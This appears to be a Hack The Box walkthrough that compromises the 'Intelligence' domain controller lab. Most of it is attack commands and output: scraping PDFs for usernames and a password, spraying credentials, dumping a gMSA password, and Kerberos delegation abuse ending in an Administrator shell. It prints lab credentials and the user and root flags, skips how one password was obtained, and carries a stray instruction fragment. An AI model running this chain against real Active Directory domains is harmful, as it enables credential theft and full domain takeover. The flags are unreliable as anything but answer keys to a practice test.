
- Open port 80
- Port 88 is Kerberos
- Port 5985 is WinRM
- Port 389 is LDAP
- Common name: dc.intelligence.htb
- Port 445 is SMB

Check port 80 with WhatWeb:

```bash
whatweb 10.10.10.248
```

This shows a domain intelligence.htb, indicating virtual hosting is in use. Save this domain and link it to the IP in the system's hosts file.

Port 445 is open; use CrackMapExec to gather more information:

```bash
crackmapexec smb 10.10.10.248
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
```

CrackMapExec has the `--shares` parameter to list shared resources:

```bash
crackmapexec smb 10.10.10.248 --shares
SMB         10.10.10.248    445    DC               [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
```

You can also use SMBMap to list shared resources:

```bash
smbmap -H 10.10.10.248 -u 'null'
[!] Authentication error on 10.10.10.248
```

These tools don't report any resources, so valid credentials are needed to view the victim machine's resources.

You need to enumerate users to try to obtain valid credentials. Use rpcclient with a null session to test if you have access:

```bash
rpcclient -U "" 10.10.10.248
Cannot connect to the server. Error was NT_STATUS_LOGON_FAILURE
```

Rpcclient does not allow enumeration without valid credentials, so you need valid credentials.

Check the HTTP service in the browser as it's a website. Try to obtain credentials or find vulnerabilities for remote command execution.

On the website, you can download PDF documents. Analyze them with exiftool to find important content like valid system users in the document metadata. The URL for the list of PDF files follows a date pattern. You can create a Bash one-liner to iterate through date ranges and attempt to download files and discover confidential information:

```bash
for i in {2020..2022}; do for j in {01..12}; do for k in {01..31}; do echo "http://10.10.10.248/documents/$i-$j-$k-upload.pdf"; done; done; done | xargs -n 1 -P 20 wget
```

After downloading the files, use the exiftool to analyze the metadata of the PDF files and search for the "creator" line containing the username:

```bash
exiftool *.pdf | grep "Creator" | awk 'NF{print $NF}' | sort -u > users
```

With this potential list of valid users, use the Kerbrute tool to validate the list of users:

```bash
kerbrute userenum --dc 10.10.10.248 -d intelligence.htb users
```

All users in the list are valid. Now that you have a list of valid users, you can perform an ASREPRoast attack and request TGTs (explain what TGTs are in this context):

```bash
GetNPUsers.py intelligence.htb/ -no-pass -usersfile users
```

Since these users do not have the "Don't require preauth" parameter set, you cannot obtain the hash.

So, recheck the previously downloaded PDF files to search for possible passwords. Use the pdftotext tool to easily read the content of each PDF file in the terminal:

```bash
for file in $(ls); do echo $file; done | grep -v users | while read filename; do pdftotext $filename; done
```

This one-liner creates text files with pdftotext for each PDF. Now, analyze each .txt file:

```bash
cat *.txt
NewIntelligenceCorpUser9876
```

You found a possible password. Use CrackMapExec to find out which user from your list this password belongs to:

```bash
crackmapexec smb 10.10.10.248 -u users -p 'NewIntelligenceCorpUser9876'
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```

Now that you have validated the credentials, you need to figure out how to gain access to the victim's machine. You can use the BloodHound Python tool to gather more information to gain access:

```bash
mkdir bloodhound
bloodhound-python -c ALL -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -ns 10.10.10.248 -d intelligence.htb
neo4j console
bloodhound &> /dev/null & disown

# In the program:
# - Upload data
# - Search for users for whom you already have credentials and mark them as "pwned" in the program
# - Then, select a user and use the "node info" option
```

This reveals that the user Ted.Graves can dump the GMSA password for SVC_INT. To do this, use the 'gmsadumper' tool:

```bash
gmsadumper -u 'Ted.Graves' -p 'Mr.Teddy' -l 10.10.10.248 -d intelligence.htb
```

You have the hash of SVC_INT, which has the "AllowedToDelegate" privilege, allowing you to impersonate the Administrator user and gain access to the machine. Use the "getST" tool:

```bash
getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :fdasfhash
```

You need the "spn" parameter for "getST," which you can find using the "pywerview" tool:

```bash
pywerview get-netcomputer -u 'Ted.Graves' -p 'Mr.Teddy' -t 10.10.10.248 --full-data
# Search for msds-allowedtodelegateto
```

When you run "getST" again, it gives you a .ccache file. Authenticate to the victim machine as Administrator using "wmiexec":

```bash
# Set the environment variable on your machine
export KRB5CCNAME=Administrator.ccache

# Execute the command
wmiexec dc.intelligence.htb -k -no-pass
```

This way, you gain access as Administrator and can consider this machine from Hack The Box solved:

- User flag: 95f3d069016706a76c6f624d1d41c82f
- Root flag: 5f5781dfc5eb477c4bb9710764b009c3